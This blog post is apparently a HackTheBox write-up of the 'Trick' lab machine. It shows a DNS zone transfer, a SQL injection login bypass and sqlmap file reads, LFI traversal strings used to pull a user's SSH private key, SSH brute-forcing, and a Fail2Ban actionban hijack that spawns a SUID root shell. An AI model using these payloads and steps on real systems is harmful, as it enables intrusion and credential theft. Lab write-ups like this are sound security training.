---
layout: post
title: "HackTheBox Writeup: Trick"
thumbnail: "/assets/images/trick-htb/20260924183437.png"
---

In this post, we work through the **Trick** machine on HackTheBox. We start by performing a DNS zone transfer to discover hidden subdomains. We then exploit a SQL injection vulnerability on a payroll application to read internal Nginx configuration files, which point us toward a second subdomain. On this marketing subdomain, a Local File Inclusion (LFI) vulnerability allows us to extract an SSH private key. Finally, we escalate to root by hijacking the action configuration of Fail2Ban and triggering a ban via SSH brute-forcing to spawn a SUID shell.

---

## 1. Enumeration

We start with a standard `nmap` scan to identify exposed services.

```bash
┌──(mracherr㉿kali)-[~]
└─$ nmap 10.129.73.33 -sC -sV
Starting Nmap 7.99 ( [https://nmap.org](https://nmap.org) ) at 2026-09-22 10:39 -0400
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp open  smtp?
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
80/tcp open  http    nginx 1.14.2
```

We see SSH (22), SMTP (25), DNS (53), and HTTP (80) open. Connecting to the SMTP port manually confirms it is running Postfix. 

### DNS Zone Transfer
Because port 53 is open, we test for misconfigured DNS settings. Using `dig -x`, we perform a reverse lookup and identify the base domain `trick.htb`. We then attempt a DNS Zone Transfer (`axfr`) to see if the server will leak its full record list:

```bash
┌──(mracherr㉿kali)-[~]
└─$ dig axfr @10.129.227.180 trick.htb

; <<>> DiG 9.20.23-1-Debian <<>> axfr @10.129.227.180 trick.htb
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb.
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
```

The zone transfer succeeds and reveals a hidden subdomain: **`preprod-payroll.trick.htb`**. We add both domains to our `/etc/hosts` file.

---

## 2. Initial Access: SQLi & LFI

### SQL Injection (Payroll Subdomain)
Browsing to the `preprod-payroll.trick.htb` login page, we intercept an authentication request. Basic manual testing with `username='+or+1%3D1--+&password=admin` successfully bypasses the login panel. 

To automate data extraction, we pass the intercepted request to `sqlmap`:

```bash
┌──(mracherr㉿kali)-[~/tmp_labs]
└─$ sqlmap -r req.txt -p username --batch --technique=BE --level 5 --risk 3
...
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=test' OR NOT 4424=4424-- CRos&password=test
```

`sqlmap` confirms the backend is MySQL. We dump the `users` table from the `payroll_db` database and retrieve an administrator password (`SuperGucciRainbowCake`), but more importantly, we discover our database user has the `FILE` privilege!

```bash
[*] 'remo'@'localhost' [1]:
    privilege: FILE
```

We use this privilege to read local files on the server (`--file-read=/etc/passwd`). We identify a system user named `michael`. We then read the Nginx configuration file (`/etc/nginx/sites-enabled/default`) to understand the web hosting structure:

```nginx
server_name preprod-marketing.trick.htb;
root /var/www/market;
index index.php;
```

### Local File Inclusion (Marketing Subdomain)
The Nginx config reveals another hidden subdomain: **`preprod-marketing.trick.htb`**. 

We run `ffuf` against this new subdomain and discover it is vulnerable to Local File Inclusion (LFI) via the `page` parameter. Using a standard LFI wordlist, we successfully extract `/etc/passwd`:

```bash
┌──(mracherr㉿kali)-[~/tools]
└─$ ffuf -w LFI-Jhaddix.txt -u [http://preprod-marketing.trick.htb/index.php?page=FUZZ](http://preprod-marketing.trick.htb/index.php?page=FUZZ) -fs 0
...
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
```

Knowing `michael` is a valid user, we leverage the LFI to read his SSH private key directly from his home directory:

```bash
┌──(mracherr㉿kali)-[~/tools]
└─$ curl [http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//home/michael/.ssh/id_rsa](http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//home/michael/.ssh/id_rsa)
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
```

We save the key, set the correct permissions (`chmod 600 id_rsa`), and successfully SSH into the machine as `michael`.

---

## 3. Privilege Escalation: Fail2Ban Hijacking

Checking our local permissions (`sudo -l`), we see that `michael` can restart the `fail2ban` service as root without providing a password:

```bash
michael@trick:~$ sudo -l
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Additionally, enumerating our group memberships reveals that `michael` belongs to the `security` group. A quick file search shows this group has write access to the Fail2Ban action configurations:

```bash
michael@trick:~$ find / -group "security" 2>/dev/null
/etc/fail2ban/action.d
```

Fail2Ban uses these `.conf` files to dictate what commands run when an IP is banned (e.g., executing `iptables` rules). Because we can edit these files and restart the service as root, we can hijack the ban action to execute arbitrary commands!

We edit the default action file (`/etc/fail2ban/action.d/iptables-multiport.conf`) and replace the `actionban` variable with a command that creates a SUID bash binary in the `/tmp` directory:

```ini
# Option:  actionban
# Notes.:  command executed when banning an IP.
actionban = cp /bin/bash /tmp/bash; chmod 4777 /tmp/bash
```

We restart the service to load our malicious configuration:

```bash
michael@trick:/etc/fail2ban$ sudo /etc/init.d/fail2ban restart                                                                                                                                     
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

To trigger the payload, we need Fail2Ban to actually ban an IP. From our attacker machine, we purposefully trigger failed authentication attempts by brute-forcing SSH using `crackmapexec`:

```bash
┌──(mracherr㉿kali)-[~]
└─$ crackmapexec ssh trick.htb -u user -p /usr/share/wordlists/rockyou.txt
```

As soon as our attacker IP is banned, Fail2Ban executes our malicious `actionban` command as root. We check the `/tmp` directory on the target and find our SUID binary waiting for us:

```bash
michael@trick:/etc/fail2ban$ ls /tmp
bash
iptables-multiport.conf

michael@trick:/etc/fail2ban$ /tmp/bash -p
bash-5.0# cat /root/root.txt
a032040b330ed7c9694074dacb0ed777
```

Machine completely compromised!